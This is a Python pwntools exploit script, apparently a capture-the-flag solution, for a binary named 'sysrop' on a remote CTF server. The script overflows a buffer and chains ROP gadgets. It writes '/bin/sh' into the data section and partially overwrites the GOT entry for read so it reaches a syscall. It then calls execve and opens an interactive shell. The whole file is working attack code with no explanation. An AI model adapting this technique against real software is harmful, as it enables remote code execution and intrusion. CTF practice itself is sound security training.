#!/usr/bin/python3

from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3024)
#p = process("./sysrop")
e = ELF("./sysrop")
context.arch = 'x86_64'
#context.log_level = 'debug'

padding = "A"*0x18
gadget = 0x004005ea # pop rax; pop rdx; pop rdi; pop rsi; ret
data = 0x601030
main = 0x4005f2

payload = padding.encode('utf-8')
payload += p64(gadget + 0x1) + p64(0x8) + p64(0x0) + p64(data) + p64(e.plt['read'])
payload += p64(main)

p.sendline(payload)
sleep(0.1)
p.send("/bin/sh\x00".encode('utf-8'))
sleep(0.1)

payload = padding.encode('utf-8')
payload += p64(gadget + 0x1) + p64(0x1) + p64(0x0) + p64(e.got['read']) + p64(e.plt['read'])
payload += p64(gadget) + p64(59) + p64(0x0) + p64(data) + p64(0x0) + p64(e.plt['read'])

p.sendline(payload)
sleep(0.1)
p.send("\x5e".encode('utf-8'))
sleep(0.1)

p.interactive()
